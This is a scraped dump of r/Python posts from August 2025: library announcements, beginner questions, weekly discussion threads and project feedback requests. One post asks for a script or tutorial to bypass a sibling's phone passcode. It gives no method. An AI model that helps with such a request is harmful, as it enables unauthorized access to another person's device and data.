* Auto-switch between PyPy & CPython based on workload
* Custom syntax support (configurable)
* Built-in benchmarking suite with CSV/JSON/Mermaid output
* RESTful API

**In development:**

* Daemon support (process management)
* Intelligent interpreter switching based on project's Python version

The syntax extension is completely optional. You can adopt it gradually or not at all. It allows for domain specific keywords, you yourself can define via a config.json

The VS Code extension allows running your scripts from the editor, or right-click to convert Python files if desired.

    pip install phicode
    phicode my_script

**Requirements:** Python 3.8+ | **License:** Phicode-License | **Platforms:** Windows, Linux

I'm curious how you experience the engine for yourself! More information is covered in the GitHub README.

Open to contributions & feedback!

**GitHub:** [https://github.com/Varietyz/phicode-runtime](https://github.com/Varietyz/phicode-runtime)  
**PyPI:** [https://pypi.org/project/phicode/](https://pypi.org/project/phicode/)  
**VS Code Extension:** [https://marketplace.visualstudio.com/items?itemName=Banes-Lab.phicode](https://marketplace.visualstudio.com/items?itemName=Banes-Lab.phicode)"
1n32lxf,Can I get some feedback on the documentation of jsonyx?,Ninteendo19d0,6,8,2025-08-29 09:20:23,https://www.reddit.com/r/Python/comments/1n32lxf/can_i_get_some_feedback_on_the_documentation_of/,"`jsonyx` is the second library I've written and the first one with proper documentation. I've tried to make it as detailed as possible, but I've no idea whether everything is clear. What do you think?

- pypi: https://pypi.org/project/jsonyx
- docs: https://jsonyx.readthedocs.io/en/latest/index.html"
1n324wb,Python feels easy‚Ä¶ until it doesn‚Äôt. What was your first real struggle?,NullPointerMood_1,823,563,2025-08-29 08:49:52,https://www.reddit.com/r/Python/comments/1n324wb/python_feels_easy_until_it_doesnt_what_was_your/,"
When I started Python, I thought it was the easiest language ever‚Ä¶ until virtual environments and package management hit me like a truck.

What was your first ‚ÄòOh no, this isn‚Äôt as easy as I thought‚Äô moment with Python?"
1n2y5ch,AIpowered desktop app for content summarization and chat (PDF/YouTube/audio processing with PySide6),Jealous_Driver_1716,0,2,2025-08-29 04:40:10,https://www.reddit.com/r/Python/comments/1n2y5ch/aipowered_desktop_app_for_content_summarization/,"**What My Project Does:**
Learnwell is an AI-powered desktop application that processes various content formats (PDFs, YouTube videos, audio files, images with OCR) and generates intelligent summaries using Google's Gemini API. It features real-time chat functionality with processed content, automatic content categorization (lectures, conversations, news, gaming streams), and conversation history management.

**Target Audience:**
Students, researchers, content creators, and professionals who need to quickly process and summarize large amounts of content from different sources. Particularly useful for anyone dealing with mixed media content who wants a unified tool rather than switching between multiple specialized applications.

**Comparison:**
Unlike web-based tools like Otter.ai (audio-only) or ChatPDF (PDF-only), Learnwell runs locally with your own API key, processes multiple formats in a single application, and maintains conversation context across sessions. It combines the functionality of several specialized tools into a unified desktop experience while keeping your data local.

**Technical Implementation:**
- PySide6 (Qt) for cross-platform GUI
- Google Gemini API for AI processing
- OpenAI Whisper for speech-to-text
- Multiprocessing architecture to prevent UI freezing during long operations
- Custom streaming response manager for optimal performance
- Dynamic dependency installation system
- Smart text chunking for large documents

The app processes content locally and only sends extracted text to the Gemini API. Users provide their own API keys (free tier available).

**GitHub:** https://github.com/1shishh/learnwell

Built over a weekend as a learning tool. Looking for feedback on the multiprocessing implementation and UI responsiveness optimizations."
1n2wr1n,üöÄ I built a Regex & Grok Tester tool (UPYNG) ‚Äì Feedback welcome!,Similar_Bad_3120,0,5,2025-08-29 03:25:56,https://www.reddit.com/r/Python/comments/1n2wr1n/i_built_a_regex_grok_tester_tool_upyng_feedback/,"Hey folks,

I wanted to share something I‚Äôve been working on recently ‚Äì a web tool called UPYNG that lets you test both Regex and Grok patterns in real time.

üëâ Why I built it?
At my company, most of the widely used regex/grok testing websites are blocked. That made day-to-day troubleshooting and log parsing pretty frustrating. So, I decided to build my own tool for personal use ‚Äì and then thought, why not share it with others who might face the same issue?

üëâ What it does:
	‚Ä¢	Test Regex patterns with instant results
	‚Ä¢	Test Grok patterns (like you would in Logstash or Beats)
	‚Ä¢	History panel so you can revisit past tests
	‚Ä¢	Comes with sample patterns + guides for quick reference
	‚Ä¢	Responsive design (works well on desktop & mobile)
	‚Ä¢	Non-intrusive space for ads (so it stays free)

üëâ Why use it?
	‚Ä¢	No login required
	‚Ä¢	Runs directly in your browser
	‚Ä¢	Lightweight, modern UI

I‚Äôm calling it UPYNG and my goal is to make it a simple, reliable companion for developers, DevOps engineers, and anyone wrangling with logs.

‚ú® I‚Äôd really love if you all could check it out, give it a spin, and share your feedback. Whether it‚Äôs bug reports, feature ideas, or UI suggestions ‚Äì I‚Äôm all ears!

Here‚Äôs the link: https://upyng.com

Thanks in advance, and I hope this makes debugging just a little less painful for some of you üôå"
1n2uol6,D&D twitch bot update 1!,ThatTurtleGM,1,0,2025-08-29 01:45:58,https://www.reddit.com/r/Python/comments/1n2uol6/dd_twitch_bot_update_1/,"So I posted about this about a week ago and included a little video link ( I think for the python groups I just made a short post, I forgot tbh), but tldr, I made a D&D themed twitch bot for twitch chatters to use while I stream. I worked on it a little since my last post, so here is the official update! 

I was wondering what other features I should go about adding, and any ideas I might want to look into. 

Here is what works: 

1.) You can pick any of the 12 D&D classes (Artificer soon)   
2.) Each class has its own channel point redemption ability that does something special  
3.) Bosses attack players who miss them, take damage in real time, and respawn after awhile.   
4.) Partake on adventures, earn EXP to level up.   
5.) You can change classes at a whim, and even between streams it memorizes your levels and current EXP for each of your classes.   
6.) (Items are MADE, but not working at the moment)   
7.) Each class and item has a value for how much they deal base damage, resist boss damage, and influence other numbers. (Some to come later)   
8.) Visuals/ sounds for each ability, bosses dying, critical hits, critical failures, and more.   
9.) Gold, earn cold hard coins for doing quests and killing bosses. 

Here is what's coming at some point:   
1.) Artificer  
2.) Boss special abilities and CC abilities, like stuns, deflections, and even temp. chatter bans.  
3.) New bosses and more quests  
4.) Working items and a shop system to spend the gold you earn.  
5.) A way to reward and punish players like the traditional Game master I am lol   
6.) A vote system for quests, and a possible skip system for quests we don't like

SO THATS THE QUESTION??? 

What should I add next? I am really interested in the ideas you may have, but I will say I'm super duper new to coding, so please go easy on me here. 

I'm coding through python, feel free to pm me! "
1n2sexh,Friday Daily Thread: r/Python Meta and Free-Talk Fridays,AutoModerator,3,1,2025-08-29 00:00:55,https://www.reddit.com/r/Python/comments/1n2sexh/friday_daily_thread_rpython_meta_and_freetalk/,"# Weekly Thread: Meta Discussions and Free Talk Friday üéôÔ∏è

Welcome to Free Talk Friday on /r/Python! This is the place to discuss the r/Python community (meta discussions), Python news, projects, or anything else Python-related!

## How it Works:

1. **Open Mic**: Share your thoughts, questions, or anything you'd like related to Python or the community.
2. **Community Pulse**: Discuss what you feel is working well or what could be improved in the /r/python community.
3. **News & Updates**: Keep up-to-date with the latest in Python and share any news you find interesting.

## Guidelines:

* All topics should be related to Python or the /r/python community.
* Be respectful and follow Reddit's [Code of Conduct](https://www.redditinc.com/policies/content-policy).

## Example Topics:

1. **New Python Release**: What do you think about the new features in Python 3.11?
2. **Community Events**: Any Python meetups or webinars coming up?
3. **Learning Resources**: Found a great Python tutorial? Share it here!
4. **Job Market**: How has Python impacted your career?
5. **Hot Takes**: Got a controversial Python opinion? Let's hear it!
6. **Community Ideas**: Something you'd like to see us do? tell us.

Let's keep the conversation going. Happy discussing! üåü"
1n2khld,AI devlopement And learning to make one,Repulsive-Leading932,0,5,2025-08-28 18:39:55,https://www.reddit.com/r/Python/comments/1n2khld/ai_devlopement_and_learning_to_make_one/,How to build an AI? What will i need to learn (in Python)? Is learning frontend or backend also part of this? Any resources you can share 
1n2h87o,A declarative fake data generator for sqlalchemy ORM,francoisnt,15,5,2025-08-28 16:37:49,https://www.reddit.com/r/Python/comments/1n2h87o/a_declarative_fake_data_generator_for_sqlalchemy/,"# SeedLayer: Declarative Fake Data for SQLAlchemy ORM

## What My Project Does
SeedLayer is a Python library that simplifies generating realistic fake data for SQLAlchemy ORM models. It allows you to define seeding behavior directly in model definitions using a declarative approach, respecting primary key (PK), foreign key (FK), and unique constraints. By leveraging the `Faker` library, it generates data for testing, development, and demo environments, automatically handling model and inter-column dependencies. The example below shows a schema with related tables (`Category`, `Product`, `Customer`, `Order`, `OrderItem`) to demonstrate FK relationships, a link table, and inter-column dependencies.

**Example**:
```python
from sqlalchemy import create_engine, Integer, String, Text, ForeignKey
from sqlalchemy.orm import DeclarativeBase, Session
from seedlayer import SeedLayer, SeededColumn, Seed, ColumnReference

class Base(DeclarativeBase):
    pass

class Category(Base):
    __tablename__ = ""categories""
    id = SeededColumn(Integer, primary_key=True, autoincrement=True)
    name = SeededColumn(String, seed=""word"")

class Product(Base):
    __tablename__ = ""products""
    id = SeededColumn(Integer, primary_key=True, autoincrement=True)
    name = SeededColumn(String, seed=""word"")
    description = SeededColumn(
        Text,
        seed=Seed(
            faker_provider=""sentence"",
            faker_kwargs={""nb_words"": ColumnReference(""name"", transform=lambda x: len(x.split()) + 5)}
        )
    )
    category_id = SeededColumn(Integer, ForeignKey(""categories.id""))

class Customer(Base):
    __tablename__ = ""customers""
    id = SeededColumn(Integer, primary_key=True, autoincrement=True)
    name = SeededColumn(String, seed=""name"", unique=True)

class Order(Base):
    __tablename__ = ""orders""
    id = SeededColumn(Integer, primary_key=True, autoincrement=True)
    customer_id = SeededColumn(Integer, ForeignKey(""customers.id""))

class OrderItem(Base):
    __tablename__ = ""order_items""
    order_id = SeededColumn(Integer, ForeignKey(""orders.id""), primary_key=True)
    product_id = SeededColumn(Integer, ForeignKey(""products.id""), primary_key=True)

engine = create_engine(""sqlite:///:memory:"")
Base.metadata.create_all(engine)
seed_plan = {
    Category: 5,
    Product: 10,
    Customer: 8,
    Order: 15,
    OrderItem: 20
}
with Session(engine) as session:
    seeder = SeedLayer(session, seed_plan)
    seeder.seed()  # Seeds related tables with realistic data
```

This example creates a schema where:
- `Category` and `Customer` have simple attributes with fake data.
- `Product` has an FK to `Category` and a `description` that depends on `name` via `ColumnReference`.
- `Order` has an FK to `Customer`.
- `OrderItem` is a link table connecting `Order` and `Product`.

Check out the [GitHub repository](https://github.com/francoisnt/seedlayer) for more details and installation instructions.

## Target Audience
SeedLayer is designed for Python developers using SQLAlchemy ORM, particularly those working on:
- **Testing**: Generate realistic test data for unit tests, integration tests, or CI/CD pipelines.
- **Development**: Populate local databases for prototyping or debugging.
- **Demos**: Create demo data for showcasing applications (e.g., Flask, FastAPI, or Django apps using SQLAlchemy).
- **Learning**: Help beginners explore SQLAlchemy by quickly seeding models with data.

It‚Äôs suitable for both production-grade testing setups and educational projects, especially for developers familiar with SQLAlchemy who want a streamlined way to generate fake data without manual scripting.

## Comparison
Unlike existing alternatives, SeedLayer emphasizes a **declarative** approach integrated with SQLAlchemy‚Äôs ORM:
- **Manual Faker Usage**: Using `Faker` directly requires writing custom scripts to generate and insert data, manually handling constraints like FKs and uniqueness. SeedLayer automates this, respecting model relationships and constraints out of the box.
- **factory_boy**: A popular library for creating test fixtures, `factory_boy` is great for Python ORMs but requires defining separate factory classes. SeedLayer embeds seeding logic in model definitions, reducing boilerplate and aligning closely with SQLAlchemy‚Äôs declarative style.
- **SQLAlchemy-Fixtures**: This library focuses on predefined data fixtures, which can be rigid. SeedLayer generates dynamic, randomized data with Faker, offering more flexibility for varied test scenarios.
- **Alembic Seeding**: Alembic‚Äôs seeding capabilities are limited and not designed for fake data generation. SeedLayer provides a robust, Faker-powered solution tailored for SQLAlchemy ORM.

SeedLayer stands out for its seamless integration with SQLAlchemy models, automatic dependency resolution, and support for complex scenarios like link tables and inter-column dependencies, making it a lightweight yet powerful tool for testing and development.

---

I‚Äôd love feedback from the Python community! Have you faced challenges generating test data for SQLAlchemy? Try SeedLayer and let me know your thoughts: [GitHub link](https://github.com/francoisnt/seedlayer)."
1n2gypa,I Built a tool that auto-syncs pre-commit hook versions with `uv.lock`,tsvikas,107,24,2025-08-28 16:27:48,https://www.reddit.com/r/Python/comments/1n2gypa/i_built_a_tool_that_autosyncs_precommit_hook/,"**TL;DR:** Auto-sync your pre-commit hook versions with `uv.lock`

    # Add this to .pre-commit-config.yaml
    - repo: https://github.com/tsvikas/sync-with-uv
      rev: v0.3.0
      hooks:
        - id: sync-with-uv

**Benefits:**

* Consistent tool versions everywhere (local/pre-commit/CI)
* Zero maintenance
* Keeps pre-commit's isolation and caching benefits
* Works with [pre-commit.ci](http://pre-commit.ci)

# The Problem

[PEP 735](https://peps.python.org/pep-0735/) recommends putting dev tools in `pyproject.toml` under `[dependency-groups]`. But if you also use these tools as pre-commit hooks, you get version drift:

* `uv update` bumps `black` to `25.1.0` in your lockfile
* Pre-commit still runs `black==24.2.0`
* Result: inconsistent results between local tool and pre-commit.

# What My Project Does

This tool reads your `uv.lock` and automatically updates `.pre-commit-config.yaml` to match.

Works as a pre-commit (see above) or as a one-time run: `uvx sync-with-uv`

# Target Audience

developers using `uv` and `pre-commit`

# Comparison¬†

‚ùå Using manual updates?

* Cumbersome
* Easy to forget

‚ùå Using  local hooks?

    - repo: local
      hooks:
        - id: black
          entry: uv run black

* Breaks [pre-commit.ci](http://pre-commit.ci)
* Loses pre-commit's environment isolation and tool caching

‚ùå Removing the tools from `pyproject.toml`?

* Annoying to repeatedly type `pre-commit run black`
* Can't pass different CLI flags (`ruff --select E501 --fix`)
* Some IDE integration breaks (when it requires the tool in your environment)
* Some CI integrations break (like the black action auto-detect of the installed version)

Similar tools:

* [`sync_with_poetry`](https://github.com/floatingpurr/sync_with_poetry) \- Poetry version
* [`sync-pre-commit-lock`](https://github.com/GabDug/sync-pre-commit-lock) \- PDM/Poetry plugin

# Try it out: [https://github.com/tsvikas/sync-with-uv](https://github.com/tsvikas/sync-with-uv)

‚≠ê **Star if it helps!** Issues and PRs welcome. ‚≠ê"
1n2ekkm,Lightweight Statistical Forecasting (Own Model Design),Optimal_Act_6987,7,0,2025-08-28 14:58:51,https://www.reddit.com/r/Python/comments/1n2ekkm/lightweight_statistical_forecasting_own_model/,"Hi everyone! I‚Äôve released a new Python library called randomstatsmodels that bundles error metrics (MAE, RMSE, MAPE, SMAPE) with auto‚ÄØtuned forecasting models like AutoNEO, AutoFourier, AutoKNN, AutoPolymath and AutoThetaAR. The library makes it easy to benchmark and build univariate forecasts; each model automatically selects hyperparameters for you.

The package is available on PyPI: https://pypi.org/project/randomstatsmodels/ (install via `pip install randomstatsmodels`).

I‚Äôd love any feedback, questions or contributions!

The GitHub for the code is: https://github.com/jacobwright32/randomstatsmodels"
1n28x84,what's the best way to organize your code app.py,DefenderXD,35,19,2025-08-28 10:48:26,https://www.reddit.com/r/Python/comments/1n28x84/whats_the_best_way_to_organize_your_code_apppy/,"Hi everyone,

I‚Äôm working on a Flask app, and right now everything is in one file ‚Äî `app.py`.  
That one file has over **3000 lines** of code. It has:

* All my routes
* Database setup
* Forms
* Helper functions
* Everything else

The app is **not fully finished yet**. I‚Äôm still adding the main features.

I‚Äôm starting to feel like the file is too big and hard to manage. But I‚Äôm not sure how to organize it


**Any advice or examples would really help!**  
Thanks a lot!"
1n26zm9,pd.col: Expressions are coming to pandas,marcogorelli,195,84,2025-08-28 08:49:19,https://www.reddit.com/r/Python/comments/1n26zm9/pdcol_expressions_are_coming_to_pandas/,"[https://labs.quansight.org/blog/pandas\_expressions](https://labs.quansight.org/blog/pandas_expressions)

In pandas 3.0, the following syntax will be valid:

    import numpy as np
    import pandas as pd
    
    df = pd.DataFrame({'city': ['Sapporo', 'Kampala'], 'temp_c': [6.7, 25.]})
    df.assign(
        city_upper = pd.col('city').str.upper(),
        log_temp_c = np.log(pd.col('temp_c')),
    )

This post explains why it was introduced, and what it does"
1n25l46,Student mental health analysis using python and SQL,Trinity_software,0,0,2025-08-28 07:16:01,https://www.reddit.com/r/Python/comments/1n25l46/student_mental_health_analysis_using_python_and/,"https://youtu.be/1evMpzJxnJ8?si=NIWsAEPDfg414Op9

Hi, this is part 1 of performing (univariate)data analysis in students mental health dataset, using python and SQL"
1n24hu3,Need someone to guide me on my Audio to text script,DarkRevolutionary320,7,4,2025-08-28 06:06:43,https://www.reddit.com/r/Python/comments/1n24hu3/need_someone_to_guide_me_on_my_audio_to_text/,"I have been trying to make script with converts my .mp4 file to text, which enables audio diarization and timestamp. Tried whisperx, pyanote, kaldi and more. My output isn‚Äôt able to recognize speaker and diarize it. Need some guidance. "
1n22kbc,We created an open-source Agentic AI framework and gathering feedback,Traditional-Let-856,0,7,2025-08-28 04:13:19,https://www.reddit.com/r/Python/comments/1n22kbc/we_created_an_opensource_agentic_ai_framework_and/,"[https://github.com/rootflo/flo-ai](https://github.com/rootflo/flo-ai)

üöÄ We‚Äôve have been working on our open-source Agentic AI framework (FloAI) for a while now. This started as something to make the use of langchain easier, so eventually it became complicated. Now we have re-vamped it to make it more lightweight, simple, and customizable ‚Äî and we‚Äôve officially removed all LangChain dependencies!

Why the move away from LangChain?  
We decided to move away from langchain because of the dependency hell it was creating and so much blotted code, which we never want to use. Even implementing new architectures became difficult with langchain

By removing LangChain, we‚Äôve:  
‚ú® Simplified agent creation & execution flows  
‚ú® Improved extensibility & customizability  
‚ú® Reduced overhead for cleaner, production-ready builds

We have also created a visual editor for Agentic Flow creation. The visual editor is still work in progress but you can find the first version in our repo

Feel free to have a look and maybe give it spin. Would be a great encouragement if you can give us a star ‚≠ê  
[https://github.com/rootflo/flo-ai](https://github.com/rootflo/flo-ai)

"
1n21i61,built a clash of clans bot after a day and a half of learnin python,Wooden_Ambassador346,3,22,2025-08-28 03:17:48,https://www.reddit.com/r/Python/comments/1n21i61/built_a_clash_of_clans_bot_after_a_day_and_a_half/,"[https://github.com/mimslarry0007-cpu/clash-of-clans-bot/commit/545228e1eb1a5e207dcc7bcf356ddf3d58bdf949](https://github.com/mimslarry0007-cpu/clash-of-clans-bot/commit/545228e1eb1a5e207dcc7bcf356ddf3d58bdf949)

its pretty bad cause it needs the specific cords an allat. i played with image recognition and got it to work but it was bad at its job and got confused all the time.

what my project does: it automatically upgrades mines, pumps, storage and the townhall. it also attacks after all that finishes.

  
Target audience: its just a thing im using to learn scripting and automation.

  
comparison: idk its prolly pretty bad lmao"
1n1xjmq,[Looking for a Collaborator] Python Programmer to finish betting bot on Telegram,Economy-Purchase-339,0,1,2025-08-28 00:09:21,https://www.reddit.com/r/Python/comments/1n1xjmq/looking_for_a_collaborator_python_programmer_to/,"Hey everyone!

I'm working on a personal Python project: a bot called **Neuroxyn** that runs on **Telegram**.
The bot detects **live value bets** (like Over goals, corners, etc.) using APIs and filters that I designed myself, and then sends the alerts directly to the Telegram channel.

The problem is, I left it halfway because I lack more advanced Python knowledge and time to polish it.
That's why I'm looking for someone who wants to **join as a collaborator** to improve the project.

What I need:
- Optimize the bot's filters and algorithms.
- Improve integration with sports APIs.
- Add extra functions (e.g., user management, statistics, logs).
- Scalability so it works more professionally.

What I offer:
- A **real and functional** project (it already detects and sends live bets).
- Participate as part of the **core team**, not as an outsider.
- Potential for income in the future if the bot is monetized or offered as a premium service.

I'm looking for people who are passionate about **Python, bots, data scraping/sports APIs** and who want to work on something innovative.
If you're interested, send me a message or leave your Telegram/Discord username.

Let's build something great together!"
1n1xczy,"Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",AutoModerator,12,0,2025-08-28 00:00:43,https://www.reddit.com/r/Python/comments/1n1xczy/thursday_daily_thread_python_careers_courses_and/,"# Weekly Thread: Professional Use, Jobs, and Education üè¢

Welcome to this week's discussion on Python in the professional world! This is your spot to talk about job hunting, career growth, and educational resources in Python. Please note, this thread is **not for recruitment**.

---

## How it Works:

1. **Career Talk**: Discuss using Python in your job, or the job market for Python roles.
2. **Education Q&A**: Ask or answer questions about Python courses, certifications, and educational resources.
3. **Workplace Chat**: Share your experiences, challenges, or success stories about using Python professionally.

---

## Guidelines:

- This thread is **not for recruitment**. For job postings, please see r/PythonJobs or the recruitment thread in the sidebar.
- Keep discussions relevant to Python in the professional and educational context.
  
---

## Example Topics:

1. **Career Paths**: What kinds of roles are out there for Python developers?
2. **Certifications**: Are Python certifications worth it?
3. **Course Recommendations**: Any good advanced Python courses to recommend?
4. **Workplace Tools**: What Python libraries are indispensable in your professional work?
5. **Interview Tips**: What types of Python questions are commonly asked in interviews?

---

Let's help each other grow in our careers and education. Happy discussing! üåü"
1n1t36y,Is it normal for a package to overwrite/add files of another already installed package?,bemna94,72,29,2025-08-27 21:04:05,https://www.reddit.com/r/Python/comments/1n1t36y/is_it_normal_for_a_package_to_overwriteadd_files/,"Hello all, I ran into something really strange and wanted check with the community.

I was running PySpark **3.5.5** and everything worked fine. Then I upgraded MLflow from a **2.x** to 3.x (with the databricks extra). Suddenly, PySpark started behaving weirdly (i. e. showing errors that should on be part of spark 4)

After isolating things in a clean environment, and analysing the impact of each dependency upon install, I discovered that **databricks-connect** (transitive dependency of mlflow) is actually modifying PySpark‚Äôs installed files directly in site-packages upon install. Not patching at runtime, not wrapping APIs; but literally overwriting PySpark‚Äôs code in place.

My assumption was that if you need custom behavior you‚Äôd monkey patch or provide an extension layer, not directly rewrite another package‚Äôs files.

Maybe this is probably better suited in r/mlflow r/apachespark or r/databricks, but my question is purely about Python package/dependency management. Is this considered normal practice anywhere, and I'm wrong to be surprised?

EDIT:

Here's how I checked this, let me know if my logic is right:  
i'm on python 3.10

* I created a fresh virtual env
* I installed pyspark==3.5.5
   * site-packages only has pyspark and its dependency (besides the default tools), and it's consistent with what I see here [https://github.com/apache/spark/tree/v3.5.5/python/pyspark/](https://github.com/apache/spark/tree/v3.5.5/python/pyspark/)
   * `pip show pyspark` shows I have 3.5.5
   * 3.5.5 is also the version I see on site-packages/pyspark/version.py
   * when I run a function import such as `from pyspark.sql.functions import lit`, it's working as expected.
* I installed databricks-conenct 16
   * I checked site-packages/pyspark, and it's nothing like [v3.5.5](https://github.com/apache/spark/tree/v3.5.5/python/pyspark/), namely, some spark 4 additions such as functions.builtin. I even ran a script to check differences between the folder before and after the install of databricks-connect and I see ""ADDED: 85 files, CHANGED: 623 files""
   * `pip show pyspark` still shows I have 3.5.5
   * on site-packages/pyspark/version.py I see 3.5.2, which is strange, and the package looks nothing like [3.5.2](https://github.com/apache/spark/tree/v3.5.2/python/pyspark)
   * running the same import gives an error
      * \`ImportError: cannot import name '\_with\_origin' from 'pyspark.errors.utils'\`"
1n1mkj5,Strategic approach for mechanical engineering student,fabriqus,0,8,2025-08-27 16:57:45,https://www.reddit.com/r/Python/comments/1n1mkj5/strategic_approach_for_mechanical_engineering/,"What modules or projects should I be looking at as a mechanical engineering student? I'm aware of all the big data science stuff but what else? Specifically, materials science, metallurgy, and dynamics, as well as FEA."
1n1lwch,need support. LITTLE BRO TOOK PICTURES.,NotAron13,0,13,2025-08-27 16:33:12,https://www.reddit.com/r/Python/comments/1n1lwch/need_support_little_bro_took_pictures/,"so my little brother who is about the young teenager age has taken some photos of stuff in my room I don't want him to have. Nothing illegal but still could get me In trouble with my parents. I've just gotten into python the last few days and really enjoy it. do you guys know how I can get access to his Samsung s22 ultra passcode (with numbers I think 6 digits) to delete the pictures. Does somebody have a SAFE script or tutorial? At least something that could bring me [further.like](http://further.like) I said no bad or illegal intent just wanna delete the pictures!

thanks to any answer in advance

"
1n1k42a,Python: The Documentary premieres on YouTube in a few hours,byaruhaf,111,10,2025-08-27 15:26:11,https://www.reddit.com/r/Python/comments/1n1k42a/python_the_documentary_premieres_on_youtube_in_a/,"Who else is setting a reminder?

[Python: The Documentary | An origin story](https://youtu.be/GfH4QL4VqJ0?si=aJWHZN7AlFL77Gnn)  
"
1n1hkls,I bundled my common Python utilities into a library (alx-common) ‚Äì feedback welcome,andrewpfl,24,27,2025-08-27 13:49:04,https://www.reddit.com/r/Python/comments/1n1hkls/i_bundled_my_common_python_utilities_into_a/,"Over the years I found developers rewriting the same helper functions across multiple projects ‚Äî things like:

* Sending text + HTML emails easily
* Normalizing strings and filenames
* Simple database utilities (SQLite, MariaDB, PostgreSQL, with parameter support)
* Config handling + paths setup

So I wrapped them up into a reusable package called [**alx-common**](https://pypi.org/project/alx-common/)

I use it daily for automation, SRE, and DevOps work, and figured it might save others the ‚Äúcopy-paste from old projects‚Äù routine.

It‚Äôs under GPLv3, so free to use and adapt. Docs + examples are in the repo, and I‚Äôm adding more over time.

Would love any feedback:

* Anything that feels missing from a ‚Äúcommon utils‚Äù package?
* Is the API style clean enough, or too opinionated?
* Anyone else packaging up their ‚Äúutility functions‚Äù into something similar?

Appreciate any thoughts, and happy to answer questions.



"
1n1dsqh,"I built prompttest - a testing framework for LLMs. It's like pytest, but for prompts.",decodingchris,0,7,2025-08-27 10:54:45,https://www.reddit.com/r/Python/comments/1n1dsqh/i_built_prompttest_a_testing_framework_for_llms/,"**What My Project Does**

**prompttest** is a command-line tool that brings automated testing to your LLM prompts. Instead of manually checking whether prompt changes break behavior, you can write tests in simple YAML files and run them directly from your terminal.

It works by running your prompt with different inputs, then using another LLM to evaluate whether the output meets the criteria you define in plain English.

Here‚Äôs a quick look at how it works:

1. Create a `.txt` file for your prompt with placeholders like `{variable}`.
2. Write a corresponding `.yml` test file where you define test cases, provide inputs for the placeholders, and specify the success criteria.
3. Run `prompttest` in your terminal to execute all your tests.
4. Get a summary in the console and detailed Markdown reports for each test run.

You can see a demo of it in the project‚Äôs README on GitHub.

**Target Audience**

This tool is for developers and teams building applications with LLMs who want to bring more rigor to their prompt engineering process. If you find it difficult to track how prompt modifications affect your outputs, **prompttest** helps catch regressions and ensures consistent quality.

It‚Äôs designed to fit naturally into a CI/CD pipeline, just like you would use `pytest` for code.

**Comparison**

The main difference between **prompttest** and other prompt-engineering tools is its focus on **automated, code-free testing from the command line**.

While many tools provide a GUI for prompt experimentation, **prompttest** is developer-first‚Äîbuilt to integrate into your existing workflow. The philosophy is to treat prompts as a critical part of your codebase, worthy of their own automated tests.

Another key advantage is the use of **YAML for test definitions**, which keeps tests readable and easy to manage, even for non-coders. Since it uses **OpenRouter**, you can also test against a wide variety of LLMs with just a single API key.

üí° I‚Äôd love to hear your feedback and answer any questions!   
üîó GitHub Repo: [https://github.com/decodingchris/prompttest](https://github.com/decodingchris/prompttest)"
1n16al4,Python package for NCAA Baseball & MLB Draft stats,Relative_Spinach7950,11,0,2025-08-27 03:19:25,https://www.reddit.com/r/Python/comments/1n16al4/python_package_for_ncaa_baseball_mlb_draft_stats/,"**What My Project Does:**

**ncaa\_bbStats**¬†is an open-source Python package for retrieving, parsing, and analyzing Division I, II, and III college baseball team statistics (2002‚Äì2025), player statistics (2021-2025), and MLB Draft data (1965-2025).

**Target Audience:**

Researchers, analysts, or general fans looking to see how teams perform from 2002-2025 and players from 2021-2025. 

**Comparison**:

It was hard finding any resources for college baseball, but of the ones I did find I couldn't find direct statistical retrieve functions for research purposes. Especially that of players and team statistics. I hope this project is able to fulfill that.

**Main Text:**

Hey everyone,

I built a Python package called¬†**ncaa\_bbStats**¬†that lets you pull and analyze NCAA Division I, II, and III baseball stats (2002‚Äì2025), player stats (2021‚Äì2025), and MLB Draft data (1965‚Äì2025).

Some things you can do with it:

* Get team stats like BA, ERA, OBP, SLG, FPCT
* Compute Pythagorean expectation & compare to actual records
* Build player leaderboards (HR leaders, K/9 leaders, etc.)
* Retrieve MLB Draft picks for any NCAA team since 1965

Docs:¬†[https://collegebaseballstatspackage.readthedocs.io/](https://collegebaseballstatspackage.readthedocs.io/)  
PyPI:¬†[https://pypi.org/project/ncaa-bbStats/](https://pypi.org/project/ncaa-bbStats/)  
GitHub:¬†[https://github.com/CodeMateo15/CollegeBaseballStatsPackage](https://github.com/CodeMateo15/CollegeBaseballStatsPackage)

It‚Äôs still under development, so I‚Äôd love feedback, collaborators, or even just a GitHub ‚≠ê if you think it‚Äôs cool.

If you‚Äôre into college baseball, MLB draft history, or sports analytics with Python, check it out and let me know what you think!

NOTE: new profile cause I have public info on the github I don't want to link to my actual account lol

"
1n10c30,jupytercad-mcp: Control JupyterCAD using LLMs/natural language.,Material_Pool_986,3,0,2025-08-26 22:44:21,https://www.reddit.com/r/Python/comments/1n10c30/jupytercadmcp_control_jupytercad_using/,"**What My Project Does**: An MCP server for JupyterCAD that allows you to control it using LLMs/natural language.

**Target Audience:** Anyone interested in CAD + generative AI.

**Comparison**: I couldn't find any other MCP servers for JupyterCAD(?)

Demo: https://github.com/user-attachments/assets/7edb31b2-2c80-4096-9d9c-048ae27c54e7

Repo: https://github.com/asmith26/jupytercad-mcp"
1n0yv7u,Python DX for data & analytics infrastructure,03cranec,17,0,2025-08-26 21:44:03,https://www.reddit.com/r/Python/comments/1n0yv7u/python_dx_for_data_analytics_infrastructure/,"Hey everyone - I‚Äôve been thinking a lot about Python developer experience for data infrastructure, and why it matters almost as much performance. We‚Äôre not just building data warehouses for BI dashboards and data science anymore. OLAP and real-time analytics are powering massively scaled software development efforts. But the DX is still pretty outdated relative to modern software dev‚Äîthings like schemas in YAML configs, manual SQL workflows, and brittle migrations.

I‚Äôd like to propose eight core principles to bring analytics developer tooling in line with modern software engineering: **git-native workflows, local-first environments, schemas as python code, modularity, open‚Äësource tooling, AI/copilot‚Äëfriendliness, and transparent CI/CD + migrations.**

We‚Äôve started implementing these ideas in[ MooseStack](https://github.com/514-labs/moosestack) (open source, MIT licensed):

* **Migrations** ‚Üí before deploying, your code is diffed against the live schema and a migration plan is generated. If drift has crept in, it fails fast instead of corrupting data.
* **Local development** ‚Üí your entire data infra stack materialized locally with one command. Branch off main, and all production models are instantly available to dev against.
* **Type safety** ‚Üí rename a column in your code, and every SQL fragment, stream, pipeline, or API depending on it gets flagged immediately in your IDE.

I‚Äôd love to spark a genuine discussion here, especially with those of you who have worked with analytical systems like Snowflake, Databricks, BigQuery, ClickHouse, etc and tried building production workloads in Python:

* Is developing in a local environment that mirrors production important for these workloads?
* How do you currently move from dev ‚Üí prod in OLAP or analytical systems? Do you use staging environments?¬†
* Where do your workflows stall‚Äîmigrations, environment mismatches, config?
